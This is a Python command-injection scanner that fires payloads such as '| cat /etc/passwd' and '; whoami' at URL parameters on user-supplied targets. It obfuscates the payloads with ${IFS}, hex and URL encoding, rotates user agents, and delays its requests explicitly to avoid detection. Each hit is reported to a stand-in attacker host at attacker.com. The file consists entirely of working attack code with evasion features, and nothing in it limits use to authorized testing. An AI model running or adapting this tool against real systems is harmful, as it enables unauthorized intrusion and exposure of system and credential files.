import requests
import urllib.parse
import threading
import json
import time
import os
import random
import subprocess

# Global settings
TIMEOUT = 10
THREADS = 5
HEADERS_LIST = [
    {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) CommandScanner"},
    {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/91.0.4472.124"},
    {"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/91.0.4472.124"}
]
PAYLOADS_DIR = "payloads"
LOG_FILE = "scan_results.json"
SUCCESS_LOG_FILE = "successful_injections.json"
ERROR_LOG_FILE = "error_log.json"
TARGETS_FILE = "targets.txt"
OOB_SERVER = "http://attacker.com/log.php?data="

# Proxy settings
USE_PROXY = False
USE_TOR = False
PROXY_LIST = [
    {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}
]
PROXIES = PROXY_LIST if USE_PROXY else [None]

# Logging results
results = []
successful_injections = []
errors = []

# Ensure payload directory exists
def ensure_payloads_dir():
    if not os.path.exists(PAYLOADS_DIR):
        os.makedirs(PAYLOADS_DIR)
        print(f"[!] Created missing payloads directory: {PAYLOADS_DIR}")
        with open(os.path.join(PAYLOADS_DIR, "default_payloads.txt"), "w") as f:
            f.write("; whoami\n&& id\n| cat /etc/passwd\n|| uname -a\n; echo vuln_detected\n; ping -c 5 127.0.0.1\n")
            print("[!] Added default payloads file: default_payloads.txt")

# Load payloads from external files
def load_payloads():
    ensure_payloads_dir()
    payloads = []
    for file in os.listdir(PAYLOADS_DIR):
        file_path = os.path.join(PAYLOADS_DIR, file)
        try:
            with open(file_path, "r", encoding="utf-8") as f:
                lines = [line.strip() for line in f.readlines() if line.strip()]
                if lines:
                    print(f"[+] Loaded {len(lines)} payloads from {file}")
                    payloads.extend(lines)
        except Exception as e:
            print(f"[-] Error reading {file}: {e}")
            errors.append({"file": file, "error": str(e)})
    return payloads

PAYLOADS = load_payloads()

# Obfuscation techniques
def obfuscate_payload(payload):
    obfuscation_methods = [
        lambda x: x.replace(' ', '${IFS}'),
        lambda x: x.replace(' ', '%09'),
        lambda x: x.replace(' ', '%0A'),
        lambda x: x.swapcase(),
        lambda x: urllib.parse.quote(x),
        lambda x: ''.join(['\\x' + hex(ord(c))[2:] for c in x]),  # Hex encoding
        lambda x: "echo " + x.encode("utf-8").hex() + " | xxd -r -p",  # Base64 hex conversion
    ]
    return random.choice(obfuscation_methods)(payload)

# Enhanced Response Validation
def is_command_executed(response_text):
    indicators = ["uid=", "gid=", "root", "sh: ", "command not found", "vuln_detected"]
    return any(indicator in response_text for indicator in indicators)

# Test for command injection
def test_command_injection(url, param):
    if not PAYLOADS:
        print("[-] No payloads loaded. Exiting scan.")
        return
    
    for payload in PAYLOADS:
        obfuscated_payload = obfuscate_payload(payload)
        injected_url = f"{url}?{param}={urllib.parse.quote(obfuscated_payload)}"
        start_time = time.time()
        headers = random.choice(HEADERS_LIST)
        proxy = random.choice(PROXIES)

        try:
            response = requests.get(injected_url, headers=headers, proxies=proxy if USE_PROXY else None, timeout=TIMEOUT, verify=False)
            elapsed_time = time.time() - start_time
            
            # Validate command execution
            if is_command_executed(response.text):
                print(f"[+] Confirmed Command Injection: {injected_url}")
                print(f"Payload: {obfuscated_payload}")
                print(f"Response:\n{response.text[:200]}")
                results.append({"url": injected_url, "payload": obfuscated_payload, "response": response.text[:200]})
                successful_injections.append({"url": injected_url, "payload": obfuscated_payload, "response": response.text[:200]})
                save_results()
                save_successful_injections()
                
                # Out-of-band notification
                try:
                    requests.get(f"{OOB_SERVER}{urllib.parse.quote(injected_url)}", verify=False)
                except requests.exceptions.SSLError as ssl_err:
                    print(f"[-] SSL Error while sending OOB request: {ssl_err}")
                return

        except requests.exceptions.RequestException as e:
            print(f"[-] Error testing {injected_url}: {e}")
            errors.append({"url": injected_url, "error": str(e)})
            time.sleep(random.uniform(1, 3))  # Delay to avoid detection
            continue

def save_results():
    with open(LOG_FILE, "a") as f:
        json.dump(results, f, indent=4)
        f.write("\n")

def save_successful_injections():
    with open(SUCCESS_LOG_FILE, "a") as f:
        json.dump(successful_injections, f, indent=4)
        f.write("\n")

def save_errors():
    with open(ERROR_LOG_FILE, "a") as f:
        json.dump(errors, f, indent=4)
        f.write("\n")

def scan_targets():
    if os.path.exists(TARGETS_FILE):
        with open(TARGETS_FILE, "r") as f:
            targets = [line.strip() for line in f.readlines() if line.strip()]
    else:
        targets = [input("Enter target URL: ")]
    
    params = input("Enter parameters to test (comma-separated): ").split(',')
    params = [p.strip() for p in params]
    
    threads = []
    for url in targets:
        for param in params:
            t = threading.Thread(target=test_command_injection, args=(url, param))
            t.start()
            threads.append(t)
            
            if len(threads) >= THREADS:
                for thread in threads:
                    thread.join()
                threads.clear()

    for thread in threads:
        thread.join()

    print("\n[+] Scan Completed. Results saved in scan_results.json")
    save_errors()

scan_targets()
